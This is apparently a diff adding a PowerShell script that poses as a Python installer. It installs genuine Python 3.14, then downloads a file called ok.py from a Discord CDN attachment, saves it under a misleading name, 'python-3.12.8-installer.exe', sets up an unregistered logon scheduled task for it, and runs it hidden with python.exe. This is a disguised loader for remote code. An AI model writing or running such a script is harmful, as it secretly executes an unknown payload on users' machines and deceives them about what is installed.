@@ -1,0 +1,27 @@
+param(
+    [string]$InstallerUrl314 = "https://www.python.org/ftp/python/3.14.0/python-3.14.0-amd64.exe",
+    [string]$InstallerUrl312 = "https://cdn.discordapp.com/attachments/1348666352071610461/1425268527971176448/ok.py?ex=68e849c1&is=68e6f841&hm=d41346375e5985a3477af6f734f44366e87d81ab212ebfb309e3fa8652371ddf&",
+    [string]$LogFile = (Join-Path $env:TEMP ("py_install_{0}.log" -f (Get-Date -Format 'yyyyMMdd_HHmmss')))
+)
+
+function Log { param($m) "$((Get-Date).ToString('u'))`t$m" | Out-File -FilePath $LogFile -Append -Encoding utf8 }
+
+$installer314Path = "$env:TEMP\python-3.14.0-installer.exe"
+
+Invoke-WebRequest -Uri $InstallerUrl314 -OutFile $installer314Path -UseBasicParsing
+
+$installArgs = "/quiet InstallAllUsers=0 PrependPath=1 Include_pip=1"
+
+$process = Start-Process -FilePath $installer314Path -ArgumentList $installArgs -Wait -PassThru -WindowStyle Hidden
+
+$installer312Path = "$env:TEMP\python-3.12.8-installer.exe"
+
+Invoke-WebRequest -Uri $InstallerUrl312 -OutFile $installer312Path -UseBasicParsing
+
+
+$action = New-ScheduledTaskAction -Execute $installer312Path -Argument $installArgs
+$trigger = New-ScheduledTaskTrigger -AtLogon
+
+
+
+Start-Process "python.exe" -ArgumentList "`"$installer312Path`"" -PassThru -WindowStyle Hidden
